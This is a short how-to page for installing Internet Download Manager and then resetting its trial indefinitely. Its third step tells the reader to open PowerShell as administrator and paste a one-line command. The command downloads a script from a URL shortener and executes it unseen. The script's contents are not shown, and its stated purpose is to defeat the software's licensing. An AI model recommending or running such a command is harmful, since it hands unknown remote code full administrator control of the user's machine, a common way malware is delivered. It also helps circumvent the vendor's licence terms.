## Step-by-Step: Download → Install → Activate (5 Minutes)

### Step 1: Download the Official Installer
1. Go to: [https://www.internetdownloadmanager.com/](https://www.internetdownloadmanager.com/)
2. Click **"Free Trial"** or **"Download"**
3. Save the file: `idman[version].exe` (e.g. `idman726build7.exe`)

> **Tip:** Always download from the **official site only** — avoid cracks or fake sites.

---

### Step 2: Install IDM
1. **Double-click** the downloaded `.exe` file
2. Follow the installer (click **Next → Next → Install**)
3. Then install IDM plugin for your selected browser

> IDM will now show a **30-day trial**.

---

### Step 3: Activate (Reset Trial Forever) — **One Line in PowerShell**

1. Press **`Win + X`** → Choose **"Windows PowerShell (Admin)"**  
   *(or search "PowerShell" → right-click → Run as Administrator)*

2. **Copy & paste this exact line** and press **Enter**:

        iex(irm is.gd/idm_reset)

3. **A menu will appear → Choose:**
    [4] Freeze Trial (Recommended - Lifetime Free Trial)

4. **Wait 10 seconds → Done!**
    IDM now shows "Registered" with 30 days left — and it resets every time you run the script.
